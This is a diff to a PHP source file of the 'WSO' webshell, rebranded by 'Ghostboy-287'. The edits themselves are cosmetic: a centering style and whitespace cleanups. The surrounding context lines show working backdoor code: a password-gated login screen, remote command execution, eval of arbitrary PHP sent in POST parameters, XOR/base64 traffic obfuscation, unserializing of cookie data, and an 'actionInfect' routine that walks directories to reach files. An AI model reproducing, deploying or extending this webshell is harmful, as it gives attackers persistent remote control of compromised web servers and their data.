@@ -54,7 +54,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("</br></br><pre align=center><form method=post style='font-family:fantasy;color:#ff0048;'>Hello <br>Welcome to wso webshell redesignated by Ghostboy-287<br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre>
+	die("</br></br><pre align=center><form method=post style='font-family:fantasy;color:#ff0048;text-align: center;'>Hello <br>Welcome to wso webshell redesignated by Ghostboy-287<br><br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='border:none;background-color:#1e252e;color:#fff;cursor:pointer;'></form></pre>
 
 
 <div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>
@@ -130,7 +130,7 @@ function hardHeader() {
     var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
     var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
     var d = document;
-	
+
 	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
 	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
 	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
@@ -723,7 +723,7 @@ function add(cmd) {
 		}
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
-	
+
 	echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
@@ -739,7 +739,7 @@ function actionPhp() {
 		eval($_POST['p1']);
 		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
 		echo strlen($temp), "\n", $temp;
-		exit; 
+		exit;
 	}
 	hardHeader();
 	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
@@ -770,7 +770,7 @@ function actionPhp() {
 function actionFilesMan() {
     if (!empty ($_COOKIE['f']))
         $_COOKIE['f'] = @unserialize($_COOKIE['f']);
-    
+
 	if(!empty($_POST['p1'])) {
 		switch($_POST['p1']) {
 			case 'uploadFile':
@@ -1137,7 +1137,7 @@ function actionInfect() {
 						if($file != "." && $file != "..") {
 							if(is_dir($dir . "/" . $file)) {
 								$inner_files = ListFiles($dir . "/" . $file);
-								if(is_array($inner_files)) $files = array_merge($files, $inner_files); 
+								if(is_array($inner_files)) $files = array_merge($files, $inner_files);
 							} else {
 								array_push($files, $dir . "/" . $file);
 							}
